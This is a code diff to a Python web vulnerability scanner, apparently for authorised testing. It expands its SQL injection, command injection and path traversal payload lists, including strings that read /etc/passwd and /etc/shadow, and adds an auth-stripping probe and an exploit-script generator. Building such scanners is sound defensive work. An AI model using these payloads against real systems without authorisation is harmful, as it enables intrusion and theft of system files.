@@ -161,28 +161,88 @@ def _payload_for(vuln_type: str, policy: Policy) -> str:
         return "<FILE>"
     if vuln_type == "IDOR":
         return "<ID_MUTATION>"
+    if vuln_type == "Unauthenticated API Access":
+        return "<STRIP_AUTH>"
     return ""
 
 
 def _payloads_for(vuln_type: str, policy: Policy) -> List[str]:
     if vuln_type == "SQL Injection":
         return [
-            _sqli_probe(policy),
-            "\"",
-            "' OR 1=1-- ",
+            "'", "\"", "')", "\"))", "';", "\";",
+            "' OR 1=1--", "\" OR 1=1--", "' OR '1'='1'--",
+            "' OR 1=1#", "\" OR 1=1#", "') OR 1=1--",
+            "' UNION SELECT NULL--", "' UNION SELECT 1,2,3,4,5,6--",
+            "'; WAITFOR DELAY '0:0:5'--",
+            "'; SELECT pg_sleep(5)--",
+            "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
+            "' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
+            "(select(0)from(select(sleep(5)))v)/*'+(select(0)from(select(sleep(5)))v)+'\"+(select(0)from(select(sleep(5)))v)+\"*/",
+            "admin'--", "admin' #",
+            "' AND 1=1--", "' AND 1=2--",
+            "1' AND 1=1--", "1' AND 1=2--"
         ]
     if vuln_type == "Command Injection":
         cmd = policy.prefer_cmd_probe()
-        return [f";{cmd}", f"|{cmd}", f"$({cmd})"]
+        return [
+            f";{cmd}", f"|{cmd}", f"&{cmd}", f"&&{cmd}", f"||{cmd}",
+            f";whoami", f"|whoami", f"&whoami", f"&&whoami", f"||whoami",
+            f";sleep 5", f"|sleep 5", f"&sleep 5",
+            f"$({cmd})", f"`{cmd}`", f"$(whoami)",
+            f";cat /etc/passwd", f"\\n{cmd}\\n",
+            f";wh$1oami", f";w'h'o'a'm'i",
+            f";{{{cmd},}}", f"%0a{cmd}",
+            f"|ping -c 1 127.0.0.1"
+        ]
     if vuln_type == "Path Traversal":
-        return ["../etc/hosts", "..%2fetc%2fhosts", "..\\etc\\hosts"]
+        return [
+            "../../../../../../../../../../etc/passwd",
+            "../../../../../../../../../../etc/hosts",
+            "../../../../../../../../../../windows/win.ini",
+            "../../../../../../../../../../boot.ini",
+            "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
+            "..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
+            "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
+            "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc%5cpasswd",
+            "..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255cetc%255cpasswd",
+            "....//....//....//....//etc/passwd",
+            "..\\/..\\/..\\/..\\/etc/passwd",
+            "..%u2215..%u2215etc%u2215passwd",
+            "../../../../../../../../../../etc/passwd%00",
+            "../../../../../../../../../../etc/passwd\\0",
+            "php://filter/convert.base64-encode/resource=index.php",
+            "php://filter/convert.base64-encode/resource=/etc/passwd",
+            "/etc/passwd",
+            "C:\\windows\\win.ini",
+            "\\\\127.0.0.1\\c$\\windows\\win.ini",
+            "/proc/self/environ",
+            "/var/log/apache2/access.log",
+            "../../../../../../../../../../etc/shadow"
+        ]
     if vuln_type == "Unrestricted File Download":
-        return ["../../../../etc/hosts", "..%2f..%2f..%2f..%2fetc%2fhosts"]
+        return [
+            "../../../../../../../../../../etc/passwd",
+            "../../../../../../../../../../etc/hosts",
+            "../../../../../../../../../../windows/win.ini",
+            "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
+            "../../../../../../../../../../etc/passwd%00"
+        ]
     if vuln_type == "Unrestricted File Upload":
         return ["<FILE>"]
     if vuln_type == "IDOR":
         return ["<ID_MUTATION>"]
+    if vuln_type == "Unauthenticated API Access":
+        return ["<STRIP_AUTH>"]
     return [""]
+
+
+def default_payloads(vuln_type: str, policy: Policy, max_payloads: int = 3) -> List[str]:
+    payloads = _payloads_for(vuln_type, policy)
+    if not payloads:
+        payloads = [_payload_for(vuln_type, policy)]
+    if max_payloads > 0:
+        return payloads[:max_payloads]
+    return payloads
 
 
 def _diff_evidence(base, probe, base_time: float, probe_time: float) -> str:
@@ -365,139 +425,225 @@ def _extract_upload_url(text: str) -> str | None:
     return None
 
 
-def probe_candidates(req, candidates, policy: Policy, active: bool = False) -> List[ProbeResult]:
-    results: List[ProbeResult] = []
-    baseline_cache: Dict[str, Tuple[requests.Response, float]] = {}
-
-    def get_baseline() -> Tuple[requests.Response, float]:
-        key = "baseline"
-        if key not in baseline_cache:
-            headers = _base_headers(req.headers)
-            baseline_cache[key] = _send(req, req.url, headers, req.body)
-        return baseline_cache[key]
-
-    for c in candidates:
-        payloads = _payloads_for(c.vuln_type, policy)
-        payload = payloads[0] if payloads else _payload_for(c.vuln_type, policy)
-        status = "PROBING"
-        evidence = ""
-        tool = "python_script"
-        path_hint = f"path_hint={urlparse(req.url).path}" if c.location == "path" else ""
-
-        if c.vuln_type == "SQL Injection":
-            tool = "sqlmap"
-        if c.vuln_type == "IDOR":
-            tool = "python_script"
-
-        if not active:
-            results.append(
-                ProbeResult(
-                    str(uuid.uuid4()),
-                    c.vuln_type,
-                    f"{c.param}/{c.location}",
-                    c.reason,
-                    tool,
-                    payload,
-                    status,
-                    path_hint,
-                )
-            )
+def _strip_auth_headers(headers: Dict[str, str]) -> tuple[Dict[str, str], List[str]]:
+    stripped: Dict[str, str] = {}
+    removed: List[str] = []
+    blocked = {
+        "authorization",
+        "proxy-authorization",
+        "cookie",
+        "x-api-key",
+        "x-auth-token",
+        "x-csrf-token",
+        "x-xsrf-token",
+    }
+    for k, v in headers.items():
+        if k.lower() in blocked:
+            removed.append(k)
             continue
+        stripped[k] = v
+    return stripped, removed
 
-        # Active probing via HTTP replay (lightweight)
-        if c.vuln_type != "Unrestricted File Upload":
-            try:
-                base_r, base_t = get_baseline()
-            except Exception as e:
-                for p in payloads:
-                    results.append(
+
+def _unauth_evidence(base, probe, removed_headers: List[str], req_path: str) -> str:
+    if base is None or probe is None:
+        return json.dumps({"unauth": "no_response"})
+    base_text = base.text if hasattr(base, "text") else base.content.decode("utf-8", errors="ignore")
+    probe_text = probe.text if hasattr(probe, "text") else probe.content.decode("utf-8", errors="ignore")
+    ratio = difflib.SequenceMatcher(None, base_text, probe_text).ratio()
+    auth = _auth_hint(probe_text.lower())
+    base_len = len(base.content)
+    probe_len = len(probe.content)
+    len_ratio = (probe_len / base_len) if base_len else 0.0
+    payload = {
+        "unauth": "compare",
+        "status_base": base.status_code,
+        "status_probe": probe.status_code,
+        "len_base": base_len,
+        "len_probe": probe_len,
+        "len_ratio": round(len_ratio, 2),
+        "similarity": round(ratio, 2),
+        "auth_hint": auth,
+        "removed_auth_headers": removed_headers,
+        "base_snip": _snippet(base_text),
+        "probe_snip": _snippet(probe_text),
+        "path": req_path,
+    }
+    return json.dumps(payload, ensure_ascii=False)
+
+
+def probe_candidate(
+    req,
+    candidate,
+    policy: Policy,
+    *,
+    active: bool = False,
+    payloads: List[str] | None = None,
+    baseline: Tuple[requests.Response, float] | None = None,
+) -> List[ProbeResult]:
+    c = candidate
+    results: List[ProbeResult] = []
+    payload_list = payloads[:] if payloads else default_payloads(c.vuln_type, policy, max_payloads=3)
+    payload = payload_list[0] if payload_list else _payload_for(c.vuln_type, policy)
+    status = "PROBING"
+    evidence = ""
+    tool = "python_script"
+    path_hint = f"path_hint={urlparse(req.url).path}" if c.location == "path" else ""
+
+    if c.vuln_type == "SQL Injection":
+        tool = "sqlmap"
+    if c.vuln_type == "IDOR":
+        tool = "python_script"
+    if c.vuln_type == "Unauthenticated API Access":
+        tool = "python_script"
+
+    if not active:
+        return [
+            ProbeResult(
+                str(uuid.uuid4()),
+                c.vuln_type,
+                f"{c.param}/{c.location}",
+                c.reason,
+                tool,
+                payload,
+                status,
+                path_hint,
+            )
+        ]
+
+    if c.vuln_type != "Unrestricted File Upload":
+        try:
+            if baseline is None:
+                headers = _base_headers(req.headers)
+                base_r, base_t = _send(req, req.url, headers, req.body)
+            else:
+                base_r, base_t = baseline
+        except Exception as e:
+            for p in payload_list:
+                results.append(
+                    ProbeResult(
+                        str(uuid.uuid4()),
+                        c.vuln_type,
+                        f"{c.param}/{c.location}",
+                        c.reason,
+                        tool,
+                        p,
+                        status,
+                        (f"error=baseline_failed:{e} {path_hint}").strip(),
+                    )
+                )
+            return results
+
+        if c.vuln_type == "IDOR":
+            req_path = urlparse(req.url).path or "/"
+            if c.location == "path":
+                payload_list = _mutate_path(req_path)
+                if not payload_list:
+                    return [
                         ProbeResult(
                             str(uuid.uuid4()),
                             c.vuln_type,
                             f"{c.param}/{c.location}",
                             c.reason,
                             tool,
-                            p,
+                            "",
                             status,
-                            (f"error=baseline_failed:{e} {path_hint}").strip(),
+                            "idor=skipped reason=no_mutation path_hint=" + req_path,
                         )
-                    )
-                continue
-            if c.vuln_type == "IDOR":
-                req_path = urlparse(req.url).path or "/"
-                if c.location == "path":
-                    payloads = _mutate_path(req_path)
-                    if not payloads:
-                        results.append(
-                            ProbeResult(
-                                str(uuid.uuid4()),
-                                c.vuln_type,
-                                f"{c.param}/{c.location}",
-                                c.reason,
-                                tool,
-                                "",
-                                status,
-                                "idor=skipped reason=no_mutation path_hint=" + req_path,
-                            )
-                        )
-                        continue
-                else:
-                    cur = _current_value(req, c.location, c.param)
-                    payloads = _mutate_id(cur)
-            for p in payloads:
+                    ]
+            else:
+                cur = _current_value(req, c.location, c.param)
+                payload_list = _mutate_id(cur)
+        elif c.vuln_type == "Unauthenticated API Access":
+            req_path = urlparse(req.url).path or "/"
+            for p in payload_list:
                 pid = str(uuid.uuid4())
-                if c.vuln_type == "IDOR" and c.location == "path":
-                    url, headers, body = _apply_param(req, "path", c.param, p)
-                else:
-                    url, headers, body = _apply_param(req, c.location, c.param, p)
+                headers = _base_headers(req.headers)
+                headers, removed = _strip_auth_headers(headers)
                 try:
-                    r, elapsed = _send(req, url, headers, body)
-                    if c.vuln_type == "IDOR":
-                        evidence = _idor_evidence(base_r, r, base_t, elapsed, urlparse(req.url).path or "/")
-                    else:
-                        evidence = _diff_evidence(base_r, r, base_t, elapsed)
+                    r, _ = _send(req, req.url, headers, req.body)
+                    evidence = _unauth_evidence(base_r, r, removed, req_path)
                 except Exception as e:
                     evidence = f"error={e}"
                 if path_hint:
                     evidence = f"{evidence} {path_hint}".strip()
                 results.append(ProbeResult(pid, c.vuln_type, f"{c.param}/{c.location}", c.reason, tool, p, status, evidence))
-        else:
-            field = _find_multipart_file_field(req.body)
-            if not field:
-                results.append(ProbeResult(str(uuid.uuid4()), c.vuln_type, f"{c.param}/{c.location}", c.reason, tool, payload, status, "upload field not found"))
-                continue
+            return results
+
+        for p in payload_list:
+            pid = str(uuid.uuid4())
+            if c.vuln_type == "IDOR" and c.location == "path":
+                url, headers, body = _apply_param(req, "path", c.param, p)
+            else:
+                url, headers, body = _apply_param(req, c.location, c.param, p)
             try:
-                files = {field: ("redscan.txt", b"redscan", "text/plain")}
-                headers = _base_headers(req.headers)
-                headers.pop("Content-Type", None)
-                start = time.time()
-                r = requests.request(req.method, req.url, headers=headers, files=files, timeout=10)
-                elapsed = time.time() - start
-                hint = ""
-                body_lower = r.text.lower()
-                for token in ["uploaded", "success", "file", "url"]:
-                    if token in body_lower:
-                        hint = token
-                        break
-                url_hint = _extract_upload_url(r.text)
-                verify = ""
-                if url_hint:
-                    try:
-                        vr = requests.get(url_hint, timeout=10)
-                        if "redscan" in vr.text:
-                            verify = "verified=content_match"
-                        else:
-                            verify = "verified=miss"
-                    except Exception:
-                        verify = "verified=error"
-                if url_hint:
-                    hint = f"{hint}|{url_hint}" if hint else url_hint
-                evidence = f"status={r.status_code} len={len(r.content)} time={elapsed:.2f}s hint={hint} {verify}".strip()
+                r, elapsed = _send(req, url, headers, body)
+                if c.vuln_type == "IDOR":
+                    evidence = _idor_evidence(base_r, r, base_t, elapsed, urlparse(req.url).path or "/")
+                else:
+                    evidence = _diff_evidence(base_r, r, base_t, elapsed)
             except Exception as e:
                 evidence = f"error={e}"
-            results.append(ProbeResult(str(uuid.uuid4()), c.vuln_type, f"{c.param}/{c.location}", c.reason, tool, payload, status, evidence))
+            if path_hint:
+                evidence = f"{evidence} {path_hint}".strip()
+            results.append(ProbeResult(pid, c.vuln_type, f"{c.param}/{c.location}", c.reason, tool, p, status, evidence))
+        return results
 
-    return results
+    field = _find_multipart_file_field(req.body)
+    if not field:
+        return [
+            ProbeResult(
+                str(uuid.uuid4()),
+                c.vuln_type,
+                f"{c.param}/{c.location}",
+                c.reason,
+                tool,
+                payload,
+                status,
+                "upload field not found",
+            )
+        ]
+    try:
+        files = {field: ("redscan.txt", b"redscan", "text/plain")}
+        headers = _base_headers(req.headers)
+        headers.pop("Content-Type", None)
+        start = time.time()
+        r = requests.request(req.method, req.url, headers=headers, files=files, timeout=10)
+        elapsed = time.time() - start
+        hint = ""
+        body_lower = r.text.lower()
+        for token in ["uploaded", "success", "file", "url"]:
+            if token in body_lower:
+                hint = token
+                break
+        url_hint = _extract_upload_url(r.text)
+        verify = ""
+        if url_hint:
+            try:
+                vr = requests.get(url_hint, timeout=10)
+                if "redscan" in vr.text:
+                    verify = "verified=content_match"
+                else:
+                    verify = "verified=miss"
+            except Exception:
+                verify = "verified=error"
+        if url_hint:
+            hint = f"{hint}|{url_hint}" if hint else url_hint
+        evidence = f"status={r.status_code} len={len(r.content)} time={elapsed:.2f}s hint={hint} {verify}".strip()
+    except Exception as e:
+        evidence = f"error={e}"
+    return [
+        ProbeResult(
+            str(uuid.uuid4()),
+            c.vuln_type,
+            f"{c.param}/{c.location}",
+            c.reason,
+            tool,
+            payload,
+            status,
+            evidence,
+        )
+    ]
 
 
 def write_raw_request(raw: str) -> str:
@@ -535,8 +681,16 @@ print(r.text[:1000])
     return script.strip()
 
 
-def run_python_script(code: str) -> str:
-    with tempfile.NamedTemporaryFile("w", suffix=".py", delete=False) as f:
-        f.write(code)
-        path = f.name
-    return path
+def build_unauth_exploit(req) -> str:
+    headers = _base_headers(req.headers)
+    headers, removed = _strip_auth_headers(headers)
+    script = f"""
+import requests
+headers = {headers!r}
+removed_auth_headers = {removed!r}
+print("removed_auth_headers=", removed_auth_headers)
+r = requests.request('{req.method}', '{req.url}', headers=headers, data={req.body!r}, timeout=10)
+print(r.status_code)
+print(r.text[:1000])
+"""
+    return script.strip()
